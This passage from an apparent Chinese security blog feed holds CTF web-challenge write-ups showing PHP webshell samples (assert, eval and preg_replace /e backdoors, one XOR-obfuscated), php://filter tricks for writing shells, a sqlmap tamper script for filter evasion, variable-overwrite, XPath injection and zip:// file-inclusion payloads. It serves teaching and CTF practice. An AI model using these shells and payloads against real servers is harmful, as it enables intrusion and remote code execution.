            <category> life </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 9 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-9-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="01-50">01 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$e = $_REQUEST[&apos;a&apos;]; </span><br><span class="line">$arr = array($_POST[&apos;b&apos;] =&gt; &apos;|.*|e&apos;,); </span><br><span class="line">array_walk($arr, $e, &apos;&apos;);</span><br></pre></td></tr></table></figure>
<p>如上代码，是一个PHP木马。是可以用菜刀连接的。</p>
<p>这里用到array_walk函数</p>
<p>array_walk() 函数对数组中的每个元素应用用户自定义函数。在函数中，数组的键名和键值是参数。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_walk(array,myfunction,userdata...)</span><br></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>array</td>
<td style="text-align:center">必需。规定数组。</td>
</tr>
<tr>
<td>myfunction</td>
<td style="text-align:center">必需。用户自定义函数的名称。</td>
</tr>
<tr>
<td>userdata,…</td>
<td style="text-align:center">可选。规定用户自定义函数的参数。您能够向此函数传递任意多参数。</td>
</tr>
</tbody>
</table>
<p>网上给的是用assert函数，但是这里用assert不行。然后在学长的提醒下，这里提到|e，</p>
<p>所以可以用preg_replace函数.</p>
<p>如下图构造菜刀连接</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_1.png" alt=""></p>
<p>或者直接hackbar</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_2.png" alt=""></p>
<h2><span id="02-100">02 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002/index.php" target="_blank" rel="noopener">http://47.100.121.220:28002/index.php</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">echo &quot;&lt;/br&gt;&quot;; </span><br><span class="line">highlight_file(&apos;echo.php&apos;); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush(); </span><br><span class="line">//关键缓存每5分钟清理一次。&lt;/br&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">include &quot;func.php&quot;; </span><br><span class="line"></span><br><span class="line">$your_real_ip = real_ip(); </span><br><span class="line">$path = &quot;temp/&quot;.$your_real_ip.&quot;_http_request_history.txt&quot;; </span><br><span class="line"></span><br><span class="line">$url = &apos;http://&apos;.$_SERVER[&apos;HTTP_HOST&apos;].$_SERVER[&apos;REQUEST_URI&apos;]; </span><br><span class="line">echo $your_real_ip.&quot;&lt;/br&gt;&quot;; </span><br><span class="line">echo $url; </span><br><span class="line"></span><br><span class="line">$fout = null; </span><br><span class="line">if(file_exists($path)) &#123; </span><br><span class="line">    $fout = fopen($path, &quot;ab&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">else &#123; </span><br><span class="line">    $fout = fopen($path, &quot;wb&quot;) or die(&quot;Unable to open file!&quot;); </span><br><span class="line">&#125; </span><br><span class="line">fwrite($fout, $url.&quot;\n&quot;); </span><br><span class="line">fclose($fout); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里也提到了一种PHP木马的写法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">ob_start(&apos;assert&apos;); </span><br><span class="line">echo $_REQUEST[&apos;pass&apos;]; </span><br><span class="line">ob_end_flush();</span><br></pre></td></tr></table></figure>
<p>ob_start(“assert”)的意思设置assert作为ob操作结束时回调函数，</p>
<p>这个PHP木马是没有回显的</p>
<p>但是在给出的echo.php的代码有给出一些提示</p>
<p>这里说到的是temp文件夹是有写的权限的。</p>
<p>所以如下执行</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_3.png" alt=""></p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/09_4.png" alt=""></p>
<h3><span id="login-100">login 100</span></h3><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目注册完账号登录后会提示你</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">您已登录成功，但只有nari用户才可以看到flag.</span><br></pre></td></tr></table></figure>
<p>这里根本没有任何思路的，然后学长告诉我。</p>
<p>注册nari后加个空格就可以了，我一脸懵逼。他也不知道为什么？</p>
<p>所以我注册nari加两个空格进去了，拿到flag。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;a3afa127cfb57f423c7bc019587031020a2ce630&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[month 2 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/month-2-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="01-50">01 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><p>题目又是大写又是小写的，格式乱乱的，强迫症患了。</p>
<p>整理下代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__file__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php $k=str_replace(&apos;`&apos;,&apos;&apos;,&apos;a`s`s`e`r`t&apos;);</span><br><span class="line">$m=$_POST[m];</span><br><span class="line">if($m==null)</span><br><span class="line">	header(&apos;status:404&apos;);</span><br><span class="line">else/**/</span><br><span class="line">	$k($m);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这里的highlight_file在这里的作用就是读取文件代码的，下面是about.php的源码</p>
<p>看about的源码这里可以看出m的值为assert</p>
<p>最后的就相当于执行\$assert(\$m)，assert()执行代码。</p>
<p>传入system()函数来读取文件即可。</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/m2_1.png" alt=""></p>
<h2><span id="02-50">02 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002/02.php" target="_blank" rel="noopener">http://47.100.121.220:28002/02.php</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">highlight_file(&apos;about.php&apos;); </span><br><span class="line">?&gt; &lt;?php </span><br><span class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </span><br><span class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </span><br><span class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </span><br><span class="line">@$YT($TH^$TU); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个题目也有highlight_file函数也是用来读about的源码</p>
<p>这里我们可以直接测试输出这三个变量</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">$YT=&quot;\x61\x73\x73\x65\x72\x74&quot;; </span><br><span class="line">$TH=&quot;\x80\xD3\xCB\x85\x9E\xB4\xB7\xCF\xD8\xBB\xCB\xCC\xD8\xE7\xA3\xD9\xC2\xBE\xAC&quot;; </span><br><span class="line">$TU=&quot;\xE5\xA5\xAA\xE9\xB6\x90\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\xE8\x9F\x97\x97&quot;; </span><br><span class="line">echo $YT;</span><br><span class="line">echo $TH^$TU; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>代码运行得到</p>
<p>\$YT=assert </p>
<p>\$TH^\$TUeval($_POST[0x41]);</p>
<p>0x41是十六进制数，表示的字符是大写字符A，A的ASCII码为65</p>
<p>这里我用A传参是穿不进去的，用0x41也不行。但是用65可以成功传参</p>
<p>同样传入system函数执行命令</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/m2_2.png" alt=""></p>
<h2><span id="gift-100">gift 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003/" target="_blank" rel="noopener">http://47.100.121.220:28003/</a></p>
<h3><span id="解答">解答</span></h3><p>右键查看源码可以发现备份文件gift.php.bak</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=&apos;xxx&apos;;</span><br><span class="line">extract($_GET);</span><br><span class="line">if(isset($gift))</span><br><span class="line">&#123;</span><br><span class="line">	$content=trim(file_get_contents($flag));</span><br><span class="line">	if($gift==$content)</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;flag&#123;...&#125;&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">	else</span><br><span class="line">	&#123;</span><br><span class="line">		echo&apos;Oh..&apos;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>代码如上，这里考到一个变量覆盖的问题。</p>
<p>题目使用了extract(\$_GET)接收了GET请求中的数据，并将键名和键值转换为变量名和变量的值，然后再进行两个if 的条件判断，所以可以使用GET提交参数和值，利用extract()对变量进行覆盖，从而满足各个条件。</p>
<p>GET请求 ?flag=\&amp;gift=，extract()会将\$flag和\$gift的值覆盖了，将变量的值设置为空或者不存在的文件就满足\$gift == \$content。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28003/gift.php?flag=&amp;gift=</span><br></pre></td></tr></table></figure>
<h2><span id="variable-100">variable 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28004" target="_blank" rel="noopener">http://47.100.121.220:28004</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">$s = &quot;You can not get the flag!&lt;/br&gt;&quot;;</span><br><span class="line">echo $s;</span><br><span class="line"></span><br><span class="line">show_source(__FILE__);</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;a&apos;])) &#123;</span><br><span class="line">    $args = $_GET[&apos;a&apos;];</span><br><span class="line">    if(!preg_match(&quot;/^\w+$/&quot;,$args)) &#123;</span><br><span class="line">        die(&quot;error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    eval(&quot;var_dump($$args);&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>看代码可以看出我们需要去读flag.php里的变量flag，</p>
<p>这里变量可以用\$\$这种方式来传入我们的变量a通过var_dump函数来读取</p>
<p>传入flag是行不通的，flag.php中的存有flag的变量名并不是flag。</p>
<p>但是我们可以传入GLOBALS</p>
<p>\$GLOBALS是PHP中的全局变量，用来储存全局作用域中的变量</p>
<p>所以payload如下，得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28004/04.php?a=GLOBALS</span><br></pre></td></tr></table></figure>
<h2><span id="price-100">price 100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28005" target="_blank" rel="noopener">http://47.100.121.220:28005</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目纠结了很久，对order by 注入是不熟悉的，这里我找到了一篇关于order by注入的文章</p>
<p><a href="https://www.cnblogs.com/REscan/p/6884278.html" target="_blank" rel="noopener">Mysql Order By 注入总结</a></p>
<p>但是这里看的还是有些不懂的，不知道具体怎么去读取数据库的flag。</p>
<p>从文章里看出order by 注入是可以直接用sqlmap来跑的</p>
<p>但是测试可以发现，题目过滤空格和加号的，但是我还是不想手注，</p>
<p>想用sqlmap只能直接写个tamper了，tamper原来里面是有把空格变换成加号的脚本的。</p>
<p>但是这里加号也是过滤了的，我们只需要把tamper里的space2plus.py修改一下即可。</p>
<p>这里我们可以用%09来绕过</p>
<p>tamper 代码具体如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    if payload:</span><br><span class="line">        retVal = &quot;&quot;</span><br><span class="line">        quote, doublequote, firstspace = False, False, False</span><br><span class="line"></span><br><span class="line">        for i in xrange(len(payload)):</span><br><span class="line">            if not firstspace:</span><br><span class="line">                if payload[i].isspace():</span><br><span class="line">                    firstspace = True</span><br><span class="line">                    retVal += &quot;%09&quot;</span><br><span class="line">                    continue</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &apos;\&apos;&apos;:</span><br><span class="line">                quote = not quote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &apos;&quot;&apos;:</span><br><span class="line">                doublequote = not doublequote</span><br><span class="line"></span><br><span class="line">            elif payload[i] == &quot; &quot; and not doublequote and not quote:</span><br><span class="line">                retVal += &quot;%09&quot;</span><br><span class="line">                continue</span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    return retVal</span><br></pre></td></tr></table></figure>
<p>这里我们用这个脚本就能跑sqlmap了</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/m2_3.png" alt=""></p>
<h2><span id="hello-100">hello    100</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28006" target="_blank" rel="noopener">http://47.100.121.220:28006</a></p>
<h3><span id="解答">解答</span></h3><p>这个题拿到手是没有什么思路的，</p>
<p>但是做题之前之前习惯用burpsuit抓个包，利用scan扫一下的。</p>
<p>发现提示存在xpath注入</p>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/m2_4.png" alt=""></p>
<p>这里的payload还爆出了三个类似用户名的信息</p>
<p>这个是HCTF 2015的一个原题，题目的把用户名改了</p>
<p>但是burpsuit已经帮我爆出了用户名。</p>
<p>修改下writeup的payload就可以得到flag了</p>
<p>具体的等考完试，看看xpath注入的内容结合题目源码去理解原理。</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28006/06.php?name=nari%27]|//*|user[user=%27ctfer</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 7 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-7-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="01-50">01 50</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><h4><span id="preg_replace">preg_replace()</span></h4><p>preg_replace() 函数用于正则表达式的搜索和替换。</p>
<h5><span id="语法">语法：</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed preg_replace( mixed pattern, mixed replacement, mixed subject [, int limit ] )</span><br></pre></td></tr></table></figure>
<h5><span id="参数说明">参数说明：</span></h5><table>
<thead>
<tr>
<th>参数</th>
<th style="text-align:center">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td>pattern</td>
<td style="text-align:center">正则表达式</td>
</tr>
<tr>
<td>replacement</td>
<td style="text-align:center">替换的内容</td>
</tr>
<tr>
<td>subject</td>
<td style="text-align:center">需要匹配替换的对象</td>
</tr>
<tr>
<td>limit</td>
<td style="text-align:center">可选，指定替换的个数，如果省略 limit 或者其值为 -1，则所有的匹配项都会被替换</td>
</tr>
</tbody>
</table>
<h5><span id="特别说明">特别说明</span></h5><p>当Pattern参数使用/e修正符时，preg_replace函数会将replacement参数当作 PHP代码执行，那么，针对此种情况，当replacement内容为用户可控数据时，就可能导致命令注入攻击漏洞的形成。</p>
<p>由以上知识点可以得到本题的payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28001/01.php?a=/c/e&amp;b=system(&apos;cat flag.php&apos;)&amp;3=c</span><br></pre></td></tr></table></figure>
<h2><span id="exit-150">exit 150</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28002" target="_blank" rel="noopener">http://47.100.121.220:28002</a></p>
<h3><span id="解答">解答</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">$c = &quot;&lt;?php exit;?&gt;&quot;; </span><br><span class="line">@$c.=$_GET[&apos;c&apos;]; </span><br><span class="line">@$filename = $_GET[&apos;file&apos;]; </span><br><span class="line">@file_put_contents($filename, $c); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>题目给出了源码，我们可以看出这里是利用file_put_contents()函数来写shell，但是写入的shell里开头会加上</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exit;?&gt;;</span><br></pre></td></tr></table></figure>
<p>导致shell中写入的内容无法被解析，这里我们就需要想办法绕过这段代码</p>
<p>之前看过P神的一篇文章有讲过这个“死亡exit”的问题</p>
<p>具体可以参考P神博客</p>
<p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p>
<p>博客里介绍了三种方法绕过</p>
<p>第一种使用php://filter/write=convert.base64-decode</p>
<p>正如P神博客说的</p>
<p>“phpexit”一共7个字符，因为base64算法解码时是4个byte一组，所以给他增加1个“a”一共8个字符。这样，”phpexita”被正常解码，而后面我们传入的webshell的base64内容也被正常解码。结果就是&lt;?php exit; ?&gt;没有了。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+</span><br></pre></td></tr></table></figure>
<p>我本地环境可以写Shell，连接菜刀可以。但是题目环境不行。</p>
<p>我们可以尝试写system函数读取flag，查看源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=convert.base64-decode/resource=z.php&amp;c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs/Pg==</span><br></pre></td></tr></table></figure>
<p>第二种使用php://filter/write=string.strip_tags|convert.base64-decode/resource</p>
<p>php://filter允许使用多个过滤器，我们可以先将webshell用base64编码。在调用完成strip_tags后再进行base64-decode。“死亡exit”在第一步被去除，而webshell在第二步被还原。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.strip_tags|convert.base64-decode/resource=z.php&amp;c=PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOz8+</span><br></pre></td></tr></table></figure>
<p>这个payload跟php版本有关的，我本地5.4的可以。题目环境不行。</p>
<p>第三种使用php://filter/write=string.rot13/resource</p>
<p>利用rot13编码独立完成任务。原理和上面类似，核心是将“死亡exit”去除。&lt;?php exit; ?&gt;在经过rot13编码后会变成&lt;?cuc rkvg; ?&gt;，在PHP不开启short_open_tag时，php不认识这个字符串，当然也就不会执行了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28002/02.php?file=php://filter/write=string.rot13/resource=a.php&amp;c=&lt;?cuc @riny($_CBFG[&apos;n&apos;]);?&gt;</span><br></pre></td></tr></table></figure>
<p>菜刀链接，如果不连接不上可以用system函数。</p>
<h2><span id="easy_gallery-250">easy_gallery 250</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28003" target="_blank" rel="noopener">http://47.100.121.220:28003</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目是jarvisoj平台的一个原题的改编，链接如下：</p>
<p><a href="http://web.jarvisoj.com:32785" target="_blank" rel="noopener">http://web.jarvisoj.com:32785</a></p>
<p>但是基本的利用点是相同的，那就是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?page=</span><br></pre></td></tr></table></figure>
<p>这个地方存在一个文件包含的漏洞，这个地方可以利用到</p>
<p>具体可以看到我上传完后取下来的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require(&quot;header.php&quot;);</span><br><span class="line">	$page=&quot;&quot;;</span><br><span class="line">	if (isset($_GET[&apos;page&apos;]))</span><br><span class="line">		$page=$_GET[&apos;page&apos;].&quot;.php&quot;;</span><br><span class="line">	else</span><br><span class="line">		$page=&quot;main.php&quot;;</span><br><span class="line">	include($page);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个地方加上了一个.php是一个利用点。</p>
<p>根据原题的解题思路上传.jpg，然后利用这个文件包含点，%00截断是不行的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?page=图片ID.jpg%00</span><br></pre></td></tr></table></figure>
<p>在甜哥提醒下还是利用到了PHP伪协议，突然发现PHP伪协议在CTF题目利用到的很多</p>
<p>这里利用到zip://这个协议，具体可以参考我的博客</p>
<p><a href="https://uknowsec.cn/posts/notes/php%E6%94%AF%E6%8C%81%E7%9A%84%E5%8D%8F%E8%AE%AE%E5%92%8C%E5%B0%81%E8%A3%85%E5%8D%8F%E8%AE%AE%E5%B0%8F%E7%BB%93.html">php支持的协议和封装协议小结</a></p>
<p>这里我们可以结合zip://和文件包含来解析我们的shell</p>
<p>具体，我们想写一个shell.php，zip打包，把扩展名改为.jpg上传</p>
<p>在文件包含利用点用以下payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.100.121.220:28003/index.php?page=zip://uploads/图片ID.jpg#shell</span><br></pre></td></tr></table></figure>
<p>根据zip协议的知识和view的代码，shell后加上.php后缀。这样就可以被解析了。</p>
<p>我们就可以用菜刀连接到shell.php得到flag。</p>
]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[week 6 for cnas writeup]]></title>
      <url>https://uknowsec.cn/posts/ctf/week-6-for-cnas-writeup.html</url>
      <content type="html"><![CDATA[<!-- ttoc -->
<h2><span id="文件包含-10">文件包含 10</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/01.php" target="_blank" rel="noopener">http://47.100.121.220:28001/01.php</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目又是一个文件包含的题目，这里直接用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=php://filter/read=convert.base64-encode/resource=./key.php</span><br></pre></td></tr></table></figure>
<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/flie1111.png" alt=""></p>
<h2><span id="sql注入-10">SQL注入 10</span></h2><h3><span id="题目链接">题目链接</span></h3><p><a href="http://47.100.121.220:28001/02.php" target="_blank" rel="noopener">http://47.100.121.220:28001/02.php</a></p>
<h3><span id="解答">解答</span></h3><p>这个题目是一个注入题，经过测试可以知道过滤了空格，这里可以用%09进行绕过</p>
